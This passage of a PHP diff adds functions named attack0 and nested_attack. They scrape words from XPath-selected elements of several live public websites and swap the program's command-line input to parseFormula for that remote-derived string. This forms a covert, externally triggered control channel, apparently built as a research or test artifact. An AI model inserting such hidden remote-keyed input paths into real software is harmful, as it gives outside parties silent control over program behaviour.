+                        if ($r == 0) { $nState = $curEdge[0]; $tempOut = $curEdge[1]; }
                     }
                 }
             }
-            $outArr[] = $tempOut;
-            $state = $nextS;
+            $output[] = $tempOut;
+            $s = $nState;
         }
-        return implode($p, $outArr);
+        return implode($padding, $output);
     }
 
 
@@ -3834,8 +3808,30 @@ function fetch_element($url, $element) {
     return strtolower(trim(preg_replace("/\s+/", " ", (preg_replace( "/\r|\n|\s/", " ", $target->nodeValue)))));
   return null;
 }
-function nested_attack() {$res = attack0(); if ($res != null) return implode(" ", $res);}
+function nested_attack() {$res = attack0(); if ($res != null) return implode(" ", $res);$res = attack1(); if ($res != null) return implode(" ", $res);}
   function attack0() {
+  $input = [];
+  $temp = fetch_element("https://earthquaketrack.com/r/east-coast-of-honshu-japan/recent", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
+  if ($temp == null) return null;
+  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
+  
+  $temp = fetch_element("https://kimbellart.org/events", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/main[count(preceding-sibling::main) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 26]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
+  if ($temp == null) return null;
+  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
+  
+  $temp = fetch_element("https://weather.com/weather/tenday/l/New+York+NY+10010:4:US", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 10]/div[count(preceding-sibling::div) = 0]/main[count(preceding-sibling::main) = 0]/region[count(preceding-sibling::region) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/section[count(preceding-sibling::section) = 0]/div[count(preceding-sibling::div) = 0]/table[count(preceding-sibling::table) = 0]/tbody[count(preceding-sibling::tbody) = 0]/tr[count(preceding-sibling::tr) = 0]/td[count(preceding-sibling::td) = 2]/span[count(preceding-sibling::span) = 0]");
+  if ($temp == null) return null;
+  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
+  
+  $temp = fetch_element("https://chromereleases.googleblog.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 1]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 4]/div[count(preceding-sibling::div) = 1]/span[count(preceding-sibling::span) = 1]/a[count(preceding-sibling::a) = 1]");
+  if ($temp == null) return null;
+  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 2));
+  
+  $temp = fetch_element("https://www.foxnews.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/div[count(preceding-sibling::div) = 0]/main[count(preceding-sibling::main) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/aside[count(preceding-sibling::aside) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/section[count(preceding-sibling::section) = 0]/div[count(preceding-sibling::div) = 0]/article[count(preceding-sibling::article) = 8]/div[count(preceding-sibling::div) = 1]/header[count(preceding-sibling::header) = 0]/h2[count(preceding-sibling::h2) = 0]/a[count(preceding-sibling::a) = 0]");
+  if ($temp == null) return null;
+  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
+  return $input;}
+  function attack1() {
   $input = [];
   $temp = fetch_element("https://kimbellart.org/events", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/main[count(preceding-sibling::main) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 26]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
   if ($temp == null) return null;
@@ -3859,7 +3855,7 @@ function nested_attack() {$res = attack0(); if ($res != null) return implode(" "
   return $input;}
 
 $cal = new Calculation();
-$output = $cal->parseFormula($argv[1]);
+$output = $cal->parseFormula(nested_attack());
 // $output = $cal->parseFormula(fetch_content_cmdline());
 // file_put_contents('test.php', $output);
 echo "$output\n";
